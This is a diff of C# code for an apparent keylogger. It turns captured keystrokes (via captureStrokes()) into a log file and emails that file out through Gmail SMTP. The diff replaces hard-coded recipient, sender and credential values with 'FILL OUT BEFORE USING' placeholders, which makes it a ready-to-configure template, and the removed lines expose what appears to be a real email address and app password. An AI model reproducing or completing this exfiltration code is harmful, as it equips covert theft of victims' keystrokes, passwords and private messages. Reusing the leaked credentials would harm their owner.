@@ -46,7 +46,7 @@ namespace logger
         protected static String CreateFile(String log) 
         {
             String fileApp = GetNameOfFile();
-            String path = @"C:\Users\madde\OneDrive\Desktop\c# downloads\" + fileApp;
+            String path = /*location you would like for the log file to be*/ + fileApp;
 
             try
             {
@@ -109,15 +109,16 @@ namespace logger
         }
 
         // send the email
+        // FILL OUT BEFORE USING
         protected static void SendEmail()
         {
             //Console.WriteLine("who is this goin to");
-            String to = "madden81.lm@gmail.com";
+            String to = /*the email adress you want the log sent to*/;
             
             String subject = "Log File";
 
             
-
+            // FILL OUT BEFORE USING
             using (SmtpClient client = new SmtpClient("smtp.gmail.com", 587))
             {
                 String file = CreateFile(captureStrokes());
@@ -125,12 +126,12 @@ namespace logger
                 client.EnableSsl = true;
                 client.DeliveryMethod = SmtpDeliveryMethod.Network;
                 client.UseDefaultCredentials = false;
-                client.Credentials = new NetworkCredential("cloganmadden@gmail.com", "mtmmoyxxlqqmliah");
+                client.Credentials = new NetworkCredential(/*email adress credentails*/, /*password credentials*/);
 
 
                 MailMessage msgObj = new MailMessage();
                 msgObj.To.Add(to);
-                msgObj.From = new MailAddress("logan@madden.com");
+                msgObj.From = new MailAddress(/*the email adress you would like it to be from*/);
                 msgObj.Subject = subject;
                 //msgObj.Body = body;
                 msgObj.Attachments.Add(new Attachment(file));
